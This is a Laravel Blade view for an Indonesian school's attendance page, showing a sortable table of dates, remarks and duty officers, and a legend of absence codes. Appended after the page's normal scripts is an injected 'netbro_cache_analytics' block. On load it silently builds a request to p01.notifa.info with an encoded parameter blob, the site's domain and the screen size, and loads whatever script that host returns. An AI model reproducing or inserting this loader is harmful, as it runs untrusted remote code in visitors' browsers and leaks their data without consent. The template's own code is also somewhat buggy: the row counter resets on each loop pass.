



 @extends('layouts.member')
@section('content')

<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SISTEM ABSENSI REAL TIME</title>

    <!-- Core CSS - Include with every page -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="font-awesome/css/font-awesome.css" rel="stylesheet">

    <!-- Page-Level Plugin CSS - Tables -->
    <link href="css/plugins/dataTables/dataTables.bootstrap.css" rel="stylesheet">

    <!-- SB Admin CSS - Include with every page -->
    <link href="css/sb-admin.css" rel="stylesheet">

 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" ></script>
</head>

<body>
                        
                    <div class="panel panel-default">
                        <div class="panel-heading">
                       
                        
                        </div>



                       <!-- /.panel-heading -->
                        <div class="panel-body">
                            <div class="table-responsive">
                  
                                <table  class="table table-striped table-bordered table-hover">
  
                                        

<tr>
<td colspan="20" class="text-center info">Absensi</td>
</tr>
<tr>
<td colspan="5" rowspan="2"  class="text-center success">no</td>    
<td colspan="5" class="text-center success">@sortablelink('tanggal')</td>
<td colspan="5" class="text-center success">@sortablelink('keterangan')</td><td  colspan="5" class="text-center success">@sortablelink('id_PetugasPiket')</td>

</tr>
                        
<tr>
    <tbody id="absensi_siswa">
    @foreach($absensi_siswa as $data)
    @php $no = 1; @endphp
<td colspan="5" class="text-center ">{{ $no++ }}</td>
<td colspan="5" class="text-center">{{ $data->tanggal }}</td>
<td colspan="5" class="text-center">{{ $data->keterangan }}</td>
<td colspan="5" class="text-center">{{ $data->petugas_piket->nama_petugas }}</td>
                     
</tr>
   @endforeach  
        
    </tbody>          
                                </table>

                            </div>




                            <!-- /.table-responsive -->
                            <div class="well">
                                <h4>Keterangan Absensi</h4>
                                <p>A = Tidak Masuk Tanpa Keterangan</p>
                                <p>I = Tidak Masuk Ada Surat Ijin Atau Pemberitahuan</p>
                                <p>S = Tidak Masuk Ada Surat Dokter Atau Pemberitahuan</p>
                                <p>M = Hadir</p>
                                <p>N = Belum Ada Keterangan Absensi</p>
                                <p>L = Hari Libur </p>
</div>
</div>
</div>
                            </div>
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
      
    <!-- Core Scripts - Include with every page -->
    <script type="text/javascript">
        $(document).ready (function (){
            $('#kelas').on('change', function(e){
        var id = e.target.value;
        $.get('{{ url('kelas')}}/'+id, function(data){
            console.log(id);
            console.log(data);
            $('#absensi_siswa').empty();
            $.each(data, function(index, element){
                $('#absensi_siswa').append("<tr><td>"+element.id+"</td><td>"
                    +element.id_kelas+"</td><td>"+element.nama_kelas+"</td><td>"+element.keterangan+"</td><td>"+element.id_PetugasPiket+"</td></tr>");
            });
        
        });
        });
    });
    </script>
    <script src="js/jquery-1.10.2.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>

    <!-- Page-Level Plugin Scripts - Tables -->
    <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
    <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>

    <!-- SB Admin Scripts - Include with every page -->
    <script src="js/sb-admin.js"></script>

    <!-- Page-Level Demo Scripts - Tables - Use for reference -->
    <script>
    $(document).ready(function() {
        $('#dataTables-example').dataTable();
    });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mLjcjWn%2bvCNaJ85cVa7QpLexe2F3tjA0kdh4v0bUhBXB%2bTKh9mk5nopbRFTkfQfeIMLMGLBY1jTK9XcL4%2fnBrZWhmQoC3kzoPe5MPfKT59U9mXOWsfHC4S%2bOZPL5wPtvSCtljRSLBOPFJTexgl8o%2bi%2fsPKy4wxY7gxJPgf9I7TSgJmEcA3j29byq8ONfHAtGoAQAB8A2mgS%2bZoqdSmS6In3PRsWqzjE7tbfC%2fGztDF6fjFyZkJBcIRz4aZrGgUnnVOUVPlCESepDO8FVwc8ns2xEveWjyIbRps4AWKTOW8DVempi2PlBiKwhpLMg%2b1wwV8hitWGX4iHWzO8zK4hu%2fTKignfEAV4%2fzVIXNeKy8LQt09rxmWUV1TwuHU0Kp4mq9z9GlJBOPTpf7wmgxEXRm7eKjovuSNryyYgHOPd3U8MORMeWOAkPS8tzAwZjmqJehKL4GvvCuIN%2bUSVt0NHrJJ6pA2pSvTg5CDVPiilVAUx%2bUO%2ftJrLHR1MtfYCdnY0MjRhJWVhX%2bfm0C3XDL%2br%2blTit7U9UkrTy5OrJOMz%2fM9pjBFhixWV1tdVyfddYqoXKnkpPtMJCQqknbwmp%2fKWG%2bYRPAu3VXtWMc" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>

@endsection
